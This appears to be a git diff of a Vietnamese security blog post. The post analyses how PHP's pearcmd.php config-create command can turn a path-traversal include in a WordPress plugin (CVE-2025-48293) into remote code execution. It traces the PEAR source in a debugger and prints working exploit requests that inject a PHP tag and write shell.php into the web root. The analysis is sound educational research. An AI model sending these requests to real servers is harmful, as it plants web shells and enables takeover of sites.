@@ -1,5 +1,5 @@
 ---
-title: Bypass LFI Forced .php Suffix Via pearcmd
+title: Exploiting LFI2RCE Vulnerability via PHP PEARCMD
 description: Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php
 date: 2025-10-22 20:48:00 +0700
 categories: [CVE Analyst]
@@ -118,11 +118,111 @@ PHP từng có lỗ hổng liên quan ([CVE-2012-1823](https://nvd.nist.gov/vuln
 
 ![equal](equal.png "PHP vẫn thêm query-string có dấu `=` vào $_SERVER['argv']")
 
+👉 Khi truyền query string theo dạng `?a+b+c+...`, PHP sẽ tách chuỗi tại các dấu `+` và tạo ra biến `$_SERVER['argv']` dưới dạng một mảng chứa các phần tử `['a', 'b', 'c', ...]`, đúng theo cơ chế được mô tả trong RFC3875.
+
+## Testing PEAR in CLI
+Trong bài viết của tác giả có đề cập đến payload liên quan đến `config-create`, được mô tả là dùng để tạo file cấu hình.
+
+![doc-config](doc-config.png "Mô tả về config-create")
+
+Khi tôi thử chạy lệnh trên CLI:
+
+```sh
+root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create
+config-create: must have 2 parameters, root path and filename to save as
+```
+
+Khi không truyền đủ tham số, chương trình báo lỗi và yêu cầu hai tham số bắt buộc:
+
+* `root path`: thư mục gốc mà PEAR dùng để cài đặt các package và tìm cấu hình.
+* `filename`: đường dẫn tới file cấu hình sẽ được tạo ra.
+
+Thử chạy với tham số đầy đủ:
+
+```sh
+root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php
+Root directory must be an absolute path beginning with "/", was: "test_root_path"
+```
+
+Ở đây PEAR yêu cầu `test_root_path` phải là đường dẫn tuyệt đối, tức là phải có dấu `/` ở đầu.
+
+Khi chạy lại với đường dẫn hợp lệ:
+
+```sh
+root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php
+```
+
+Kết quả trả về:
+
+```text {hl_lines=[9,10,11,12,13,14,16,17,19,28,29,30,43,45]}
+Configuration (channel pear.php.net):
+=====================================
+Auto-discover new Channels     auto_discover    <not set>
+Default Channel                default_channel  pear.php.net
+HTTP Proxy Server Address      http_proxy       <not set>
+PEAR server [DEPRECATED]       master_server    <not set>
+Default Channel Mirror         preferred_mirror <not set>
+Remote Configuration File      remote_config    <not set>
+PEAR executables directory     bin_dir          /test_root_path/pear
+PEAR documentation directory   doc_dir          /test_root_path/pear/docs
+PHP extension directory        ext_dir          /test_root_path/pear/ext
+PEAR directory                 php_dir          /test_root_path/pear/php
+PEAR Installer cache directory cache_dir        /test_root_path/pear/cache
+PEAR configuration file        cfg_dir          /test_root_path/pear/cfg
+directory
+PEAR data directory            data_dir         /test_root_path/pear/data
+PEAR Installer download        download_dir     /test_root_path/pear/download
+directory
+Systems manpage files          man_dir          /test_root_path/pear/man
+directory
+PEAR metadata directory        metadata_dir     <not set>
+PHP CLI/CGI binary             php_bin          <not set>
+php.ini location               php_ini          <not set>
+--program-prefix passed to     php_prefix       <not set>
+PHP's ./configure
+--program-suffix passed to     php_suffix       <not set>
+PHP's ./configure
+PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp
+PEAR test directory            test_dir         /test_root_path/pear/tests
+PEAR www files directory       www_dir          /test_root_path/pear/www
+Cache TimeToLive               cache_ttl        <not set>
+Preferred Package State        preferred_state  <not set>
+Unix file mask                 umask            <not set>
+Debug Log Level                verbose          <not set>
+PEAR password (for             password         <not set>
+maintainers)
+Signature Handling Program     sig_bin          <not set>
+Signature Key Directory        sig_keydir       <not set>
+Signature Key Id               sig_keyid        <not set>
+Package Signature Type         sig_type         <not set>
+PEAR username (for             username         <not set>
+maintainers)
+User Configuration File        Filename         /var/www/html/test_filename.php
+System Configuration File      Filename         #no#system#config#
+Successfully created default configuration file "/var/www/html/test_filename.php"
+```
+
+Kết quả cho thấy các đường dẫn con cho từng loại dữ liệu được tự động sinh ra dưới `/test_root_path/pear`. Ở dòng cuối cùng:
+
+```
+Successfully created default configuration file "/var/www/html/test_filename.php"
+```
+
+File cấu hình được tạo trong thư mục hiện hành, không nằm trong `root_path`. Đây là hành vi mặc định của PEAR: `root_path` chỉ ảnh hưởng đến cấu trúc thư mục cài đặt, không quyết định vị trí lưu file cấu hình.
+
+Khi truy cập file `"/var/www/html/test_filename.php"` trên trình duyệt:
+
+![file-create](file-create.png "Nội dung của test_filename.php được render trên trình duyệt")
+
+File được tạo có chứa thông tin về `test_root_path`, được trình bày ở dạng `serialize`
+
+Tuy nhiên, đó mới chỉ là quá trình thực thi trên CLI. Trong trường hợp khai thác qua web, cần phân tích mã nguồn để xem cách chương trình tiếp nhận và xử lý các tham số được truyền vào.
+
 ## `pearcmd` Code Analysis
 
 Trước khi phân tích mã nguồn của `/usr/local/lib/php/pearcmd.php`, cần thiết lập môi trường debug để nắm rõ luồng thực thi - tham khảo: [https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/](https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/)
 
-Sau đó hãy copy toàn bộ mã nguồn **php** từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại `/usr/local/lib/php/pearcmd.php` bạn vẫn có thể mở và theo dõi file trên máy chủ:
+Sau đó hãy copy toàn bộ mã nguồn **php** từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại `/usr/local/lib/php/pearcmd.php` bạn vẫn có thể mở và theo dõi file tương ứng với container:
 
 ```
 sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/
@@ -150,6 +250,8 @@ if ($fetype == 'Gtk2') {
     do {
         ...
         $cmd = PEAR_Command::factory($command, $config);
+        ...
+        list($tmpopt, $params) = $tmp;
         ...
         $ok = $cmd->run($command, $opts, $params);
         if ($ok === false) {
@@ -207,7 +309,7 @@ public static function readPHPArgv()
 Nếu `$argv` không phải mảng (tức là không có dữ liệu hợp lệ), hàm sẽ cố gắng tìm giá trị tương đương ở `$_SERVER['argv']` và trả về, tức các `search-word` đường ta truyền trong URL. ví dụ:
 
 ```http
-GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
+GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/test_root_path+test_filename.php HTTP/1.1
 ```
 
 Quan sát trong debugger:
@@ -241,130 +343,145 @@ Khi hover vào `$cmd` ta thấy được các tham số yêu cầu của lệnh 
 
 ![doc](doc.png "Các tham số yêu cầu của lệnh `config-create`")
 
-```php {title="/usr/local/lib/php/PEAR/Command.php" hl_lines=[13,14,15,16]}
-public static function &factory($command, &$config)
+Và đặc biệt, ta thấy hàm thực thi cho `config-create` là `doConfigCreate`
+
+```php {title="/usr/local/lib/php/PEAR/Command.php" hl_lines=[54]}
+function doConfigCreate($command, $options, $params)
 {
-    if (empty($GLOBALS['_PEAR_Command_commandlist'])) {
-        PEAR_Command::registerCommands();
+    if (count($params) != 2) {
+        return PEAR::raiseError('config-create: must have 2 parameters, root path and ' .
+            'filename to save as');
     }
-    if (isset($GLOBALS['_PEAR_Command_shortcuts'][$command])) {
-        $command = $GLOBALS['_PEAR_Command_shortcuts'][$command];
+
+    $root = $params[0];
+    // Clean up the DIRECTORY_SEPARATOR mess
+    $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR;
+    $root = preg_replace(array('!\\\\+!', '!/+!', "!$ds2+!"),
+                            array('/', '/', '/'),
+                        $root);
+    if ($root[0] != '/') {
+        if (!isset($options['windows'])) {
+            return PEAR::raiseError('Root directory must be an absolute path beginning ' .
+                'with "/", was: "' . $root . '"');
+        }
+
+        if (!preg_match('/^[A-Za-z]:/', $root)) {
+            return PEAR::raiseError('Root directory must be an absolute path beginning ' .
+                'with "\\" or "C:\\", was: "' . $root . '"');
+        }
     }
-    if (!isset($GLOBALS['_PEAR_Command_commandlist'][$command])) {
-        $a = PEAR::raiseError("unknown command `$command'");
-        return $a;
+
+    $windows = isset($options['windows']);
+    if ($windows) {
+        $root = str_replace('/', '\\', $root);
     }
-    $class = $GLOBALS['_PEAR_Command_commandlist'][$command];
-    if (!class_exists($class)) {
-        require_once $GLOBALS['_PEAR_Command_objects'][$class];
+
+    if (!file_exists($params[1]) && !@touch($params[1])) {
+        return PEAR::raiseError('Could not create "' . $params[1] . '"');
     }
-    if (!class_exists($class)) {
-        $a = PEAR::raiseError("unknown command `$command'");
-        return $a;
+
+    $params[1] = realpath($params[1]);
+    $config = new PEAR_Config($params[1], '#no#system#config#', false, false);
+    if ($root[strlen($root) - 1] == '/') {
+        $root = substr($root, 0, strlen($root) - 1);
     }
-    $ui =& PEAR_Command::getFrontendObject();
-    $obj = new $class($ui, $config);
-    return $obj;
+
+    $config->noRegistry();
+    $config->set('php_dir', $windows ? "$root\\pear\\php" : "$root/pear/php", 'user');
+    $config->set('data_dir', $windows ? "$root\\pear\\data" : "$root/pear/data");
+    $config->set('www_dir', $windows ? "$root\\pear\\www" : "$root/pear/www");
+    $config->set('cfg_dir', $windows ? "$root\\pear\\cfg" : "$root/pear/cfg");
+    $config->set('ext_dir', $windows ? "$root\\pear\\ext" : "$root/pear/ext");
+    $config->set('doc_dir', $windows ? "$root\\pear\\docs" : "$root/pear/docs");
+    $config->set('test_dir', $windows ? "$root\\pear\\tests" : "$root/pear/tests");
+    $config->set('cache_dir', $windows ? "$root\\pear\\cache" : "$root/pear/cache");
+    $config->set('download_dir', $windows ? "$root\\pear\\download" : "$root/pear/download");
+    $config->set('temp_dir', $windows ? "$root\\pear\\temp" : "$root/pear/temp");
+    $config->set('bin_dir', $windows ? "$root\\pear" : "$root/pear");
+    $config->set('man_dir', $windows ? "$root\\pear\\man" : "$root/pear/man");
+    $config->writeConfigFile();
+    $this->_showConfig($config);
+    $this->ui->outputData('Successfully created default configuration file "' . $params[1] . '"',
+        $command);
 }
 ```
 
-Biến `$class` là giá trị của `$GLOBALS['_PEAR_Command_commandlist'][$command]` được khởi trong hàm `registerCommands()` ngay từ ban đầu khi lấy tất cả command bằng `PEAR_Command::getCommands();`
+Hàm bắt buộc phải nhận đúng 2 tham số: `root path` và `filename`. Nếu không, trả về lỗi.
 
-![class](class.png "Giá trị của `$GLOBALS['_PEAR_Command_commandlist'][$command]` và trong debugger")
-
-```php {title="/usr/local/lib/php/PEAR/Command.php"}
-$GLOBALS['_PEAR_Command_commandlist'][$command] = $class;
-```
-
-Khi khi đó `/usr/local/lib/php/PEAR/Command/Config.php` chứa class `PEAR_Command_Config` sẽ được `require_once`
-
-![requireclass](requireclass.png "/usr/local/lib/php/PEAR/Command/Config.php được require_once")
-
-Trong class `PEAR_Command_Config`, ta thấy có khai báo mảng `$commands` chứa key `config-create`
-
-![config-create-cmd](config-create-cmd.png "$commands được khai báo trong PEAR_Command_Config")
-
-`config-create` là lệnh được thực thi, nó sẽ gọi đến hàm `doConfigSet()`, là hàm xử lý đối với command `config-create`
-
-```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[7,54]}
-function doConfigSet($command, $options, $params)
-{
-    // $param[0] -> a parameter to set
-    // $param[1] -> the value for the parameter
-    // $param[2] -> the layer
-    $failmsg = '';
-    if (count($params) < 2 || count($params) > 3) {
-        $failmsg .= "config-set expects 2 or 3 parameters";
-        return PEAR::raiseError($failmsg);
-    }
-
-    if (isset($params[2]) && ($error = $this->_checkLayer($params[2]))) {
-        $failmsg .= $error;
-        return PEAR::raiseError("config-set:$failmsg");
-    }
-
-    $channel = isset($options['channel']) ? $options['channel'] : $this->config->get('default_channel');
-    $reg = &$this->config->getRegistry();
-    if (!$reg->channelExists($channel)) {
-        return $this->raiseError('Channel "' . $channel . '" does not exist');
-    }
-
-    $channel = $reg->channelName($channel);
-    if ($params[0] == 'default_channel' && !$reg->channelExists($params[1])) {
-        return $this->raiseError('Channel "' . $params[1] . '" does not exist');
-    }
-
-    if ($params[0] == 'preferred_mirror'
-        && (
-            !$reg->mirrorExists($channel, $params[1]) &&
-            (!$reg->channelExists($params[1]) || $channel != $params[1])
-        )
-    ) {
-        $msg  = 'Channel Mirror "' . $params[1] . '" does not exist';
-        $msg .= ' in your registry for channel "' . $channel . '".';
-        $msg .= "\n" . 'Attempt to run "pear channel-update ' . $channel .'"';
-        $msg .= ' if you believe this mirror should exist as you may';
-        $msg .= ' have outdated channel information.';
-        return $this->raiseError($msg);
-    }
-
-    if (count($params) == 2) {
-        array_push($params, 'user');
-        $layer = 'user';
-    } else {
-        $layer = $params[2];
-    }
-
-    array_push($params, $channel);
-    if (!call_user_func_array(array(&$this->config, 'set'), $params)) {
-        array_pop($params);
-        $failmsg = "config-set (" . implode(", ", $params) . ") failed, channel $channel";
-    } else {
-        $this->config->store($layer);
-    }
-
-    if ($failmsg) {
-        return $this->raiseError($failmsg);
-    }
-
-    $this->ui->outputData('config-set succeeded', $command);
-    return true;
+```php
+if (count($params) != 2) {
+    return PEAR::raiseError('config-create: must have 2 parameters, root path and ' .
+        'filename to save as');
 }
+$root = $params[0];
 ```
-Hàm này yêu cầu chỉ được truyền 2 đối số đối với `config-create` 
 
-Sau đó `store()` được gọi 
+Nếu ký tự đầu tiên của root path không phải là `/`, hàm kiểm tra xem có bật tuỳ chọn windows không.
 
-```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[38,39]}
-function store($layer = 'user', $data = null)
-{
-    return $this->writeConfigFile(null, $layer, $data);
+```php
+if ($root[0] != '/') {
+    if (!isset($options['windows'])) {
+        return PEAR::raiseError('Root directory must be an absolute path beginning ' .
+            'with "/", was: "' . $root . '"');
+    }
+
+    if (!preg_match('/^[A-Za-z]:/', $root)) {
+        return PEAR::raiseError('Root directory must be an absolute path beginning ' .
+            'with "\\" or "C:\\", was: "' . $root . '"');
+    }
+}
+$windows = isset($options['windows']);
+if ($windows) {
+    $root = str_replace('/', '\\', $root);
 }
 ```
 
-`writeConfigFile()` được gọi để ghi config file
+* Nếu không phải `Windows` → bắt lỗi vì yêu cầu đường dẫn bắt đầu bằng `/`.
+* Nếu là `Windows` → kiểm tra định dạng `C:` (thông qua regex) và chuyển dấu `/` thành `\` nếu cần.
 
-```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[3]}
+Sau đó, thực hiện tạo và kiểm tra file cấu hình đầu ra
+
+```php
+if (!file_exists($params[1]) && !@touch($params[1])) {
+    return PEAR::raiseError('Could not create "' . $params[1] . '"');
+}
+$params[1] = realpath($params[1]);
+```
+
+* Nếu file chưa tồn tại, cố gắng tạo bằng `touch`. Nếu không tạo được → lỗi.
+* Dùng `realpath` để lấy đường dẫn tuyệt đối thật sự của file.
+
+Tạo đối tượng cấu hình và chuẩn hoá $root
+
+```php
+$config = new PEAR_Config($params[1], '#no#system#config#', false, false);
+if ($root[strlen($root) - 1] == '/') {
+    $root = substr($root, 0, strlen($root) - 1);
+}
+$config->noRegistry();
+```
+
+Thiết lập các giá trị đường dẫn
+
+```php
+$config->set('php_dir', $windows ? "$root\\pear\\php" : "$root/pear/php", 'user');
+$config->set('data_dir', $windows ? "$root\\pear\\data" : "$root/pear/data");
+...
+$config->set('man_dir', $windows ? "$root\\pear\\man" : "$root/pear/man");
+```
+
+Cuối cùng là ghi file cấu hình, hiển thị và thông báo thành công
+
+```php {hl_lines=[1]}
+$config->writeConfigFile();
+$this->_showConfig($config);
+$this->ui->outputData('Successfully created default configuration file "' . $params[1] . '"',
+    $command);
+```
+
+`writeConfigFile()` là hàm chính dùng để ghi dữ liệu vào config file.
+
+```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[38,39,40,41]}
 function writeConfigFile($file = null, $layer = 'user', $data = null)
 {
     $this->_lazyChannelSetup($layer);
@@ -412,45 +529,43 @@ function writeConfigFile($file = null, $layer = 'user', $data = null)
 
 Đây là hàm quyết định việc ghi config file với `serialize($data)` để chuyển cấu hình thành chuỗi có thể lưu trữ.
 
+Trở lại file `pearcmd.php`, các param được tạo và gán vào `$params`.
+
+```php
+list($tmpopt, $params) = $tmp;
+```
+
+![params](params.png "Giá trị $params trong debugger")
+
 Cuối cùng, `$cmd` được thực thi bằng `$cmd->run()`
 
 ```php
 $ok = $cmd->run($command, $opts, $params);
 ```
 
-## Exploit
-
-Tận dụng [CVE](https://w41bu1.github.io/2025-10-13-cve-2025-48293/) đã phân tích để khai thác mở rộng bằng `pearcmd.php`
-
-Gửi request chứa LFI payload trỏ đến `pearcmd.php`
+## Flow
+1. Gửi GET request:
 
 ```http
-GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
-Host: localhost
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://localhost/wp-admin/
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-X-PwnFox-Color: blue
-Priority: u=0, i
+GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/test_root_path+test_filename.php
 ```
 
-**Response trả về lỗi**:
+2. Web `include` `/usr/local/lib/php/pearcmd.php`.
 
-![res1](res1.png "Response trả về lỗi")
+3. PHP (register_argc_argv=On) build `$_SERVER['argv']` từ query → `['action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&','config-create','/test_root_path','test_filename.php']`.
 
-Yêu cầu sử dụng `/<?=phpinfo();?>` thay vì `<?=phpinfo();?>` bởi vì tham số đầu tiên là `<root path>` như phân tích ở trên.
+4. `Console_Getopt::readPHPArgv()` trả `$argv`; `Console_Getopt::getopt2()` parse ra `$command='config-create'` và `list($tmpopt, $params)` trả về `$params=['/test_root_path','test_filename.php']`.
 
-**root path** tức là yêu cầu đường dẫn tuyệt đối.
+5. `doConfigCreate()` chạy với `$params` do attacker kiểm soát → `touch()`/`realpath()` và `writeConfigFile()` tạo/ghi file.
 
-Sửa payload và gửi lại.
+> [!INFO]
+> File cấu hình được tạo có chứa giá trị `root path`. Nếu giá trị này bị ghi dưới dạng một thẻ PHP hợp lệ (`<?php ... ?>`) và `file` có thể được truy cập bởi client, webserver sẽ xử lý nội dung PHP trong file đó và đoạn mã sẽ được thực thi dẫn tới **RCE**
+
+## Exploit
+
+Tận dụng [CVE-2025-48293](https://w41bu1.github.io/2025-10-13-cve-2025-48293/) đã phân tích để khai thác mở rộng bằng `pearcmd.php`
+
+Gửi request chứa LFI payload trỏ đến `pearcmd.php`
 
 ```http
 GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
